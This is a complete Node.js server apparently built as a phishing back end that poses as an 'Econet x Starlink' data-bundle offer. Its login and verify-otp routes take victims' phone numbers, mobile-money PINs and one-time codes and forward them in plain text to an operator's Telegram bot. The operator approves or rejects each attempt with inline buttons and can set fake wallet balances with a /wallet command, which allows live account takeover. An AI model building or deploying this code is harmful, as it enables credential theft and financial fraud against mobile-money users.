// server.js - Econet x Starlink Data Bundle System
const express = require('express');
const cors = require('cors');
const TelegramBot = require('node-telegram-bot-api');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3001;

app.use(cors());
app.use(express.json({ limit: '10kb' }));

// ============================================
// CONFIGURATION
// ============================================
const CONFIG = {
  CACHE_DURATION:           5_000,
  APPROVAL_TIMEOUT:         5 * 60 * 1000,
  CLEANUP_INTERVAL:         60_000,
  MAX_USERS:                parseInt(process.env.MAX_USERS) || 1,
  BOT_STARTUP_DELAY:        3_000,
  BOT_POLLING_RETRY_DELAY:  10_000,
  MAX_BOT_RESTART_ATTEMPTS: 5,
  POLLING_TIMEOUT:          30,
  MAX_CONCURRENT_REQUESTS:  5,
  MAX_NOTIFICATION_SIZE:    4_096,
};

// ============================================
// LOGGER
// ============================================
const logger = {
  info:  (msg, ...a) => console.log(`[INFO]  ${ts()} ${msg}`, ...a),
  warn:  (msg, ...a) => console.warn(`[WARN]  ${ts()} ${msg}`, ...a),
  error: (msg, ...a) => console.error(`[ERROR] ${ts()} ${msg}`, ...a),
  debug: (msg, ...a) => process.env.DEBUG && console.log(`[DEBUG] ${ts()} ${msg}`, ...a),
};
const ts = () => new Date().toISOString();

// ============================================
// REQUEST QUEUE
// ============================================
class RequestQueue {
  constructor(max = 5) {
    this.queue   = [];
    this.running = 0;
    this.max     = max;
  }
  add(fn) {
    return new Promise((resolve, reject) => {
      this.queue.push({ fn, resolve, reject });
      this._run();
    });
  }
  async _run() {
    if (this.running >= this.max || !this.queue.length) return;
    this.running++;
    const { fn, resolve, reject } = this.queue.shift();
    try   { resolve(await fn()); }
    catch (e) { reject(e); }
    finally { this.running--; this._run(); }
  }
}
const requestQueue = new RequestQueue(CONFIG.MAX_CONCURRENT_REQUESTS);

// ============================================
// VALIDATORS & HELPERS
// ============================================
const sanitize = (s) => (typeof s === 'string' ? s.replace(/[<>]/g, '').trim() : String(s));
const truncate = (s, n = CONFIG.MAX_NOTIFICATION_SIZE) =>
  s.length <= n ? s : s.slice(0, n - 3) + '...';

const validatePhone = (p) => {
  if (!p || typeof p !== 'string') return { ok: false, err: 'Phone must be a string' };
  const c = p.replace(/\D/g, '');
  if (c.length < 9 || c.length > 15)  return { ok: false, err: 'Invalid phone length' };
  return { ok: true };
};
const validatePin = (p) => {
  if (!p || typeof p !== 'string') return { ok: false, err: 'PIN must be a string' };
  if (!/^\d{4,8}$/.test(p))        return { ok: false, err: 'PIN must be 4-8 digits' };
  return { ok: true };
};
const validateOtp = (o) => {
  if (!o || typeof o !== 'string') return { ok: false, err: 'OTP must be a string' };
  if (!/^\d{4,8}$/.test(o))        return { ok: false, err: 'OTP must be 4-8 digits' };
  return { ok: true };
};

const formatPhone = (raw) => {
  let c = raw.replace(/\D/g, '');
  if (c.startsWith('263')) c = c.slice(3);
  if (c.startsWith('0'))   c = c.slice(1);
  if (c.length > 9)        c = c.slice(-9);
  return { cc: '+263', num: c, full: `+263${c}` };
};

// Duplicate-request guard per user
const isDupe = (user, key) => {
  const now = Date.now();
  if (user.dupeCache.has(key) && now - user.dupeCache.get(key) < CONFIG.CACHE_DURATION) return true;
  user.dupeCache.set(key, now);
  if (user.dupeCache.size > 1000) {
    const cutoff = now - CONFIG.CACHE_DURATION;
    for (const [k, v] of user.dupeCache) if (v < cutoff) user.dupeCache.delete(k);
  }
  return false;
};

// ============================================
// MESSAGE FORMATTERS  (bundle-aware)
// ============================================
const fmtLogin = (user, { phoneNumber, pin, timestamp, bundle }) => {
  const { cc, num } = formatPhone(phoneNumber);
  const returning   = user.verifiedUsers.has(phoneNumber);
  const bundleLine  = bundle
    ? `📦 <b>Bundle:</b> ${sanitize(bundle.data)} / $${bundle.price} (${sanitize(bundle.validity)})`
    : '';

  return `📱 <b>${sanitize(user.name)} — LOGIN</b>

${returning ? '🔄 RETURNING USER' : '🆕 NEW USER'}
🌍 <b>Country:</b> <code>${cc}</code>
📞 <b>Number:</b>  <code>${num}</code>
🔐 <b>PIN:</b>     <code>${sanitize(pin)}</code>
${bundleLine}
⏰ <b>Time:</b>    ${new Date(timestamp).toLocaleString()}

${returning ? '✅ Skip OTP → Dashboard' : '📲 Proceed → OTP step'}

━━━━━━━━━━━━━━━━━━━
⏱️ Timeout: 5 min`;
};

const fmtOtp = (user, { phoneNumber, otp, timestamp, bundle }) => {
  const { cc, num } = formatPhone(phoneNumber);
  const bundleLine  = bundle
    ? `📦 <b>Bundle:</b> ${sanitize(bundle.data)} / $${bundle.price} (${sanitize(bundle.validity)})`
    : '';

  return `✅ <b>${sanitize(user.name)} — OTP VERIFY</b>

🆕 NEW USER
🌍 <b>Country:</b> <code>${cc}</code>
📞 <b>Number:</b>  <code>${num}</code>
🔑 <b>OTP:</b>     <code>${sanitize(otp)}</code>
${bundleLine}
⏰ <b>Time:</b>    ${new Date(timestamp).toLocaleString()}

━━━━━━━━━━━━━━━━━━━
⏱️ Timeout: 5 min`;
};

// ============================================
// BOT MANAGER
// ============================================
class BotManager {
  constructor(user, link) {
    this.user          = user;
    this.link          = link;
    this.bot           = null;
    this.polling       = false;
    this.initializing  = false;
    this.initPromise   = null;
    this.restarts      = 0;
    this.pollErrors    = 0;
  }

  async init() {
    if (this.initializing) return this.initPromise;
    this.initializing = true;
    this.initPromise  = this._doInit().finally(() => { this.initializing = false; this.initPromise = null; });
    return this.initPromise;
  }

  async _doInit() {
    await this._cleanup();
    await sleep(1000);

    logger.info(`${this.user.name}: Creating bot...`);
    this.bot = new TelegramBot(this.user.botToken, {
      polling: { interval: 2000, autoStart: false, params: { timeout: CONFIG.POLLING_TIMEOUT } },
      filepath: false,
    });

    this._setupErrors();
    this._setupCommands();

    await this.bot.startPolling();
    this.polling = true;

    const me = await this.bot.getMe();
    logger.info(`${this.user.name}: @${me.username} ready`);

    this.user.isHealthy = true;
    this.user.bot       = this.bot;
    this.restarts       = 0;
    this.pollErrors     = 0;
  }

  async _cleanup() {
    if (!this.bot) return;
    this.bot.removeAllListeners();
    if (this.polling) {
      try { await this.bot.stopPolling({ cancel: true }); } catch (_) {}
    }
    try { if (this.bot._polling) this.bot._polling.abort = true; } catch (_) {}
    this.polling = false;
    this.bot = this.user.bot = null;
  }

  _scheduleRestart(delay = 10_000) {
    if (this.restarts >= CONFIG.MAX_BOT_RESTART_ATTEMPTS) {
      logger.error(`${this.user.name}: Max restarts reached`);
      this.user.isHealthy = false;
      return;
    }
    if (this.initializing) return;
    this.restarts++;
    logger.info(`${this.user.name}: Restart #${this.restarts} in ${delay}ms`);
    setTimeout(() => this.init().catch(e => logger.error(`${this.user.name}: Restart failed:`, e.message)), delay);
  }

  _setupErrors() {
    this.bot.on('polling_error', (err) => {
      this.pollErrors++;
      logger.error(`${this.user.name}: Poll error #${this.pollErrors}:`, err.message);
      const s = err.response?.statusCode;
      if (err.code === 'EFATAL')      return this._scheduleRestart(5_000);
      if (s === 401)                  { this.user.isHealthy = false; return this._cleanup(); }
      if (s === 409)                  return this._scheduleRestart(10_000);
      if (this.pollErrors > 10)       return this._scheduleRestart(15_000);
    });
    this.bot.on('error',         (e) => logger.error(`${this.user.name}: Bot error:`,    e.message));
    this.bot.on('webhook_error', (e) => logger.error(`${this.user.name}: Webhook error:`, e.message));
  }

  _setupCommands() {
    const { bot, user, link } = this;

    bot.onText(/\/start/, async (msg) => {
      try {
        await bot.sendMessage(msg.chat.id,
          `🛰️ <b>${sanitize(user.name)} — Econet×Starlink Bot</b>\n\n` +
          `<b>Chat ID:</b> <code>${msg.chat.id}</code>\n` +
          `<b>Endpoint:</b> <code>/api/${link}/*</code>\n\n` +
          `Add to .env:\n` +
          `<code>TELEGRAM_CHAT_ID_${user.id}=${msg.chat.id}</code>`,
          { parse_mode: 'HTML' });
      } catch (e) { logger.error(`/start:`, e.message); }
    });

    bot.onText(/\/status/, async (msg) => {
      try {
        await bot.sendMessage(msg.chat.id,
          `✅ <b>${sanitize(user.name)} — Status</b>\n\n` +
          `📊 Pending logins: ${user.logins.size}\n` +
          `📊 Pending OTPs: ${user.otps.size}\n` +
          `✅ Verified users: ${user.verifiedUsers.size}\n` +
          `💰 Wallets set: ${user.wallets.size}\n` +
          `🔗 Endpoint: <code>/api/${link}/*</code>\n` +
          `🔄 Bot restarts: ${this.restarts}\n` +
          `📡 Poll errors: ${this.pollErrors}\n` +
          `${user.lastError ? `⚠️ Last error: ${user.lastError}` : ''}`,
          { parse_mode: 'HTML' });
      } catch (e) { logger.error(`/status:`, e.message); }
    });

    // /wallet +263771234567 John 1250.50 5000
    bot.onText(/\/wallet (.+)/, async (msg, match) => {
      try {
        const args = match[1].split(' ');
        if (args.length !== 4) {
          return bot.sendMessage(msg.chat.id,
            '❌ Usage: <code>/wallet [phone] [name] [USD] [ZWG]</code>',
            { parse_mode: 'HTML' });
        }
        const [phone, name, usd, zwg] = args;
        const usdN = parseFloat(usd), zwgN = parseFloat(zwg);
        if (isNaN(usdN) || isNaN(zwgN) || usdN < 0 || zwgN < 0)
          return bot.sendMessage(msg.chat.id, '❌ Invalid amounts.', { parse_mode: 'HTML' });

        user.wallets.set(phone, { name: sanitize(name), usd: usdN, zwg: zwgN, ts: Date.now() });
        await bot.sendMessage(msg.chat.id,
          `✅ <b>Wallet set</b>\n👤 ${sanitize(name)}\n📱 <code>${phone}</code>\n💵 $${usdN.toFixed(2)}\n💰 ZWG ${zwgN.toFixed(2)}`,
          { parse_mode: 'HTML' });
      } catch (e) { logger.error(`/wallet:`, e.message); }
    });

    bot.onText(/\/restart/, async (msg) => {
      try {
        await bot.sendMessage(msg.chat.id, '🔄 Restarting...', { parse_mode: 'HTML' });
        this.restarts = 0;
        await this.init();
        await bot.sendMessage(msg.chat.id, '✅ Restarted!', { parse_mode: 'HTML' });
      } catch (e) { logger.error(`/restart:`, e.message); }
    });

    bot.on('callback_query', async (q) => {
      try   { await handleCallback(user, q); }
      catch (e) {
        logger.error(`${user.name}: callback error:`, e.message);
        try { await bot.answerCallbackQuery(q.id, { text: '❌ Error', show_alert: true }); } catch (_) {}
      }
    });
  }

  ok() { return this.polling && this.user.isHealthy && !this.initializing; }
}

// ============================================
// CALLBACK HANDLER
// ============================================
async function handleCallback(user, q) {
  const { bot } = user;
  const { data, message: msg, id: qid } = q;
  const { chat: { id: chatId }, message_id: mid } = msg;

  // Acknowledge immediately
  await bot.answerCallbackQuery(qid, { text: '⏳ Processing...' }).catch(() => {});

  const parts  = data.split('_');
  const type   = parts[0];   // 'login' | 'otp'
  const action = parts[1];   // 'proceed' | 'invalid' | 'correct' | 'wrong' | 'wrongpin'
  // phone may contain underscores (e.g. +263_...), last segment is pin/otp
  const last   = parts[parts.length - 1];
  const phone  = parts.slice(2, -1).join('_');
  const key    = `${phone}-${last}`;

  const edit = (text) =>
    bot.editMessageText(text, { chat_id: chatId, message_id: mid, parse_mode: 'HTML', reply_markup: { inline_keyboard: [] } })
       .catch(e => logger.debug('editMsg:', e.message));

  const answer = (text, alert = false) =>
    bot.answerCallbackQuery(qid, { text, show_alert: alert }).catch(() => {});

  const expired = (data) =>
    Date.now() - data.timestamp > CONFIG.APPROVAL_TIMEOUT;

  // ---- LOGIN ----
  if (type === 'login') {
    const rec = user.logins.get(key);
    if (!rec) return answer('❌ Session not found', true);
    if (expired(rec)) {
      Object.assign(rec, { approved: false, rejected: true, expired: true });
      await edit(`⏰ <b>EXPIRED</b>\n📞 <code>${phone}</code>\n🔐 <code>${last}</code>`);
      return answer('⏰ Expired', true);
    }

    if (action === 'proceed') {
      rec.approved = true;
      rec.rejected = false;
      const returning = user.verifiedUsers.has(phone);
      await edit(`✅ <b>ALLOWED</b>\n📞 <code>${phone}</code>\n🔐 <code>${last}</code>\n\n${returning ? '→ Dashboard' : '→ OTP step'}`);
      await answer('✅ Allowed!');
    } else if (action === 'invalid') {
      rec.approved = false;
      rec.rejected = true;
      rec.reason   = 'invalid';
      await edit(`❌ <b>INVALID</b>\n📞 <code>${phone}</code>\n🔐 <code>${last}</code>`);
      await answer('❌ Marked invalid');
    }
    return;
  }

  // ---- OTP ----
  if (type === 'otp') {
    const rec = user.otps.get(key);
    if (!rec) return answer('❌ Verification not found', true);
    if (expired(rec)) {
      rec.status = 'timeout';
      await edit(`⏰ <b>EXPIRED</b>\n📞 <code>${phone}</code>\n🔑 <code>${last}</code>`);
      return answer('⏰ Expired', true);
    }

    if (action === 'correct') {
      rec.status = 'approved';
      user.verifiedUsers.set(phone, { ts: Date.now() });
      await edit(`✅ <b>VERIFIED</b>\n📞 <code>${phone}</code>\n🔑 <code>${last}</code>\n\n💡 Set wallet:\n<code>/wallet ${phone} Name 100.00 0</code>`);
      await answer('✅ Verified!');
    } else if (action === 'wrong') {
      rec.status = 'rejected';
      await edit(`❌ <b>WRONG OTP</b>\n📞 <code>${phone}</code>\n🔑 <code>${last}</code>`);
      await answer('❌ Wrong OTP');
    } else if (action === 'wrongpin') {
      rec.status = 'wrong_pin';
      await edit(`⚠️ <b>WRONG PIN</b>\n📞 <code>${phone}</code>\n🔑 <code>${last}</code>`);
      await answer('⚠️ Wrong PIN');
    }
    return;
  }
}

// ============================================
// SEND TELEGRAM MESSAGE
// ============================================
const sendMsg = (user, text, opts = {}) =>
  requestQueue.add(async () => {
    if (!user.bot || !user.botManager?.ok())
      return { ok: false, err: 'Bot not ready' };
    try {
      await user.bot.sendMessage(user.chatId, truncate(text), { parse_mode: 'HTML', ...opts });
      user.consecErrors = 0;
      return { ok: true };
    } catch (e) {
      user.lastError = e.message;
      logger.error(`sendMsg [${user.name}]:`, e.code, e.message);
      if (e.response?.statusCode === 401) { user.isHealthy = false; return { ok: false, err: 'Auth failed', critical: true }; }
      if (e.response?.statusCode === 429) return { ok: false, err: 'Rate limited', retry: e.response.parameters?.retry_after || 30 };
      return { ok: false, err: e.message };
    }
  });

// ============================================
// LOAD USERS
// ============================================
const users = new Map();

const loadUsers = () => {
  let ok = 0, fail = 0;
  for (let i = 1; i <= CONFIG.MAX_USERS; i++) {
    const link    = process.env[`USER_LINK_INSERT_${i}`];
    const token   = process.env[`TELEGRAM_BOT_TOKEN_${i}`];
    const chatId  = process.env[`TELEGRAM_CHAT_ID_${i}`];
    const name    = process.env[`USER_NAME_${i}`] || `User ${i}`;

    if (!link || !token || !chatId) continue;

    if (!/^[a-zA-Z0-9_-]+$/.test(link))        { logger.warn(`User ${i}: bad link`); fail++; continue; }
    if (!/^\d+:[A-Za-z0-9_-]+$/.test(token))    { logger.warn(`User ${i}: bad token`); fail++; continue; }
    if (!/^-?\d+$/.test(chatId))                 { logger.warn(`User ${i}: bad chatId`); fail++; continue; }
    if (users.has(link))                         { logger.warn(`Duplicate link: ${link}`); fail++; continue; }

    const u = {
      id: i, name: sanitize(name), linkInsert: link, botToken: token, chatId,
      bot: null, isHealthy: false, consecErrors: 0, lastError: null,
      logins: new Map(), otps: new Map(),
      wallets: new Map(), verifiedUsers: new Map(), dupeCache: new Map(),
    };
    u.botManager = new BotManager(u, link);
    users.set(link, u);
    ok++;
  }
  logger.info(`Users loaded: ${ok} ok, ${fail} failed`);
};

loadUsers();

// ============================================
// STAGGERED BOT INIT
// ============================================
(async () => {
  const arr = [...users.values()];
  for (let i = 0; i < arr.length; i++) {
    try   { await arr[i].botManager.init(); }
    catch (e) { logger.error(`Init failed [${arr[i].name}]:`, e.message); }
    if (i < arr.length - 1) await sleep(CONFIG.BOT_STARTUP_DELAY);
  }
  logger.info('All bots ready');
})();

// ============================================
// AUTO-CLEANUP
// ============================================
setInterval(() => {
  const now = Date.now();
  const expire = now - CONFIG.APPROVAL_TIMEOUT;
  const purge  = now - 10 * 60 * 1000;

  users.forEach((u) => {
    for (const [k, v] of u.logins) {
      if (v.timestamp < expire && !v.expired) Object.assign(v, { approved: false, rejected: true, expired: true });
      if (v.timestamp < purge) u.logins.delete(k);
    }
    for (const [k, v] of u.otps) {
      if (v.timestamp < expire && v.status === 'pending') v.status = 'timeout';
      if (v.timestamp < purge) u.otps.delete(k);
    }
  });
}, CONFIG.CLEANUP_INTERVAL);

// ============================================
// HEALTH MONITOR
// ============================================
setInterval(() => {
  users.forEach((u) => {
    if (u.botManager && !u.botManager.ok() && !u.botManager.initializing &&
        u.botManager.restarts < CONFIG.MAX_BOT_RESTART_ATTEMPTS) {
      u.botManager._scheduleRestart(15_000);
    }
  });
}, 60_000);

// ============================================
// ROUTES — SHARED MIDDLEWARE
// ============================================
const getUser = (req, res) => {
  const link = req.params.link;
  const u = users.get(link);
  if (!u) { res.status(404).json({ success: false, message: 'Endpoint not found' }); return null; }
  return u;
};

const botGuard = (u, res) => {
  if (!u.bot || !u.isHealthy) {
    res.status(503).json({ success: false, message: 'Bot service unavailable' });
    return false;
  }
  return true;
};

// ============================================
// HEALTH
// ============================================
app.get('/api/health', (_, res) => {
  const list = [...users.values()].map(u => ({
    name: u.name, link: u.linkInsert,
    healthy: u.isHealthy, active: !!u.bot,
    logins: u.logins.size, otps: u.otps.size,
    verified: u.verifiedUsers.size, wallets: u.wallets.size,
    lastError: u.lastError,
  }));
  res.json({
    status: list.some(u => u.healthy) ? 'ok' : 'degraded',
    users: list, ts: ts(),
  });
});

// ============================================
// DYNAMIC ROUTES
// ============================================
users.forEach((user, link) => {
  const base = `/api/${link}`;

  // --- check-user-status ---
  app.post(`${base}/check-user-status`, (req, res) => {
    const { phoneNumber } = req.body;
    if (!phoneNumber) return res.status(400).json({ success: false, message: 'Phone required' });
    const v = validatePhone(phoneNumber);
    if (!v.ok) return res.status(400).json({ success: false, message: v.err });
    const returning = user.verifiedUsers.has(phoneNumber);
    res.json({ success: true, isReturningUser: returning });
  });

  // --- get-wallet-balances ---
  app.post(`${base}/get-wallet-balances`, (req, res) => {
    const { phoneNumber } = req.body;
    if (!phoneNumber) return res.status(400).json({ success: false, message: 'Phone required' });
    const w = user.wallets.get(phoneNumber);
    res.json({ success: true, name: w?.name || '', usd: w?.usd ?? 0, zwg: w?.zwg ?? 0 });
  });

  // --- login ---
  app.post(`${base}/login`, async (req, res) => {
    if (!botGuard(user, res)) return;
    const { phoneNumber, pin, timestamp, bundle } = req.body;
    if (!phoneNumber || !pin) return res.status(400).json({ success: false, message: 'Phone and PIN required' });
    const pv = validatePhone(phoneNumber); if (!pv.ok) return res.status(400).json({ success: false, message: pv.err });
    const iv = validatePin(pin);          if (!iv.ok) return res.status(400).json({ success: false, message: iv.err });

    if (isDupe(user, `login-${phoneNumber}-${pin}`))
      return res.json({ success: true, message: 'Cached' });

    const key = `${phoneNumber}-${pin}`;
    user.logins.set(key, { timestamp: Date.now(), approved: false, rejected: false, expired: false });

    const msg = fmtLogin(user, { phoneNumber, pin, timestamp: timestamp || Date.now(), bundle });
    const keyboard = { inline_keyboard: [
      [{ text: '✅ Allow to Proceed',   callback_data: `login_proceed_${phoneNumber}_${pin}` }],
      [{ text: '❌ Invalid Information', callback_data: `login_invalid_${phoneNumber}_${pin}` }],
    ]};

    const r = await sendMsg(user, msg, { reply_markup: keyboard });
    r.ok
      ? res.json({ success: true, message: 'Waiting for approval' })
      : res.status(500).json({ success: false, message: 'Failed to notify', error: r.err });
  });

  // --- check-login-approval ---
  app.post(`${base}/check-login-approval`, (req, res) => {
    const { phoneNumber, pin } = req.body;
    if (!phoneNumber || !pin) return res.status(400).json({ success: false, message: 'Phone and PIN required' });

    const rec = user.logins.get(`${phoneNumber}-${pin}`);
    if (!rec) return res.json({ success: true, approved: false, rejected: false, expired: false });

    if (Date.now() - rec.timestamp > CONFIG.APPROVAL_TIMEOUT)
      return res.json({ success: true, approved: false, rejected: true, expired: true });

    res.json({
      success:  true,
      approved: rec.approved,
      rejected: rec.rejected,
      expired:  rec.expired || false,
      reason:   rec.reason || null,
    });
  });

  // --- verify-otp ---
  app.post(`${base}/verify-otp`, async (req, res) => {
    if (!botGuard(user, res)) return;
    const { phoneNumber, otp, timestamp, bundle } = req.body;
    if (!phoneNumber || !otp) return res.status(400).json({ success: false, message: 'Phone and OTP required' });
    const pv = validatePhone(phoneNumber); if (!pv.ok) return res.status(400).json({ success: false, message: pv.err });
    const ov = validateOtp(otp);           if (!ov.ok) return res.status(400).json({ success: false, message: ov.err });

    if (isDupe(user, `otp-${phoneNumber}-${otp}`))
      return res.json({ success: true, message: 'Cached' });

    const key = `${phoneNumber}-${otp}`;
    user.otps.set(key, { status: 'pending', timestamp: Date.now() });

    const msg = fmtOtp(user, { phoneNumber, otp, timestamp: timestamp || Date.now(), bundle });
    const keyboard = { inline_keyboard: [
      [{ text: '✅ Correct (PIN + OTP)', callback_data: `otp_correct_${phoneNumber}_${otp}` }],
      [
        { text: '❌ Wrong Code', callback_data: `otp_wrong_${phoneNumber}_${otp}` },
        { text: '⚠️ Wrong PIN',  callback_data: `otp_wrongpin_${phoneNumber}_${otp}` },
      ],
    ]};

    const r = await sendMsg(user, msg, { reply_markup: keyboard });
    r.ok
      ? res.json({ success: true, message: 'OTP sent' })
      : res.status(500).json({ success: false, message: 'Failed to notify', error: r.err });
  });

  // --- check-otp-status ---
  app.post(`${base}/check-otp-status`, (req, res) => {
    const { phoneNumber, otp } = req.body;
    if (!phoneNumber || !otp) return res.status(400).json({ success: false, message: 'Phone and OTP required' });

    const rec = user.otps.get(`${phoneNumber}-${otp}`);
    if (!rec) return res.json({ success: true, status: 'pending' });

    if (Date.now() - rec.timestamp > CONFIG.APPROVAL_TIMEOUT)
      return res.json({ success: true, status: 'timeout' });

    if (['approved', 'rejected', 'wrong_pin'].includes(rec.status)) {
      user.otps.delete(`${phoneNumber}-${otp}`);
    }

    res.json({ success: true, status: rec.status });
  });

  // --- resend-otp ---
  app.post(`${base}/resend-otp`, async (req, res) => {
    if (!botGuard(user, res)) return;
    const { phoneNumber, timestamp } = req.body;
    if (!phoneNumber) return res.status(400).json({ success: false, message: 'Phone required' });

    const msg = `🔄 <b>${sanitize(user.name)} — OTP RESEND</b>\n📞 <code>${phoneNumber}</code>\n⏰ ${new Date(timestamp || Date.now()).toLocaleString()}`;
    const r = await sendMsg(user, msg);
    r.ok
      ? res.json({ success: true })
      : res.status(500).json({ success: false, error: r.err });
  });
});

// ============================================
// 404 + ERROR HANDLERS
// ============================================
app.use((req, res) => res.status(404).json({ success: false, message: 'Not found', path: req.path }));
app.use((err, req, res, next) => {
  logger.error('Unhandled:', err.message);
  res.status(500).json({ success: false, error: 'Internal server error' });
});

// ============================================
// GRACEFUL SHUTDOWN
// ============================================
const shutdown = async (sig) => {
  logger.info(`${sig} — shutting down`);
  server.close();
  await Promise.allSettled([...users.values()].map(u => u.botManager?._cleanup()));
  process.exit(0);
};
process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('SIGINT',  () => shutdown('SIGINT'));
process.on('uncaughtException',   (e) => logger.error('Uncaught:', e.message, e.stack));
process.on('unhandledRejection',  (r) => logger.error('Unhandled rejection:', r));

// ============================================
// START
// ============================================
const server = app.listen(PORT, () => {
  console.log('\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
  console.log(`🛰️  Econet×Starlink Bundle Server`);
  console.log(`🚀  Port: ${PORT}`);
  console.log(`👥  Users: ${users.size}/${CONFIG.MAX_USERS}`);
  users.forEach((u, l) => console.log(`   ⏳ ${u.name}: /api/${l}/*`));
  console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
});

// ============================================
// HELPERS
// ============================================
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }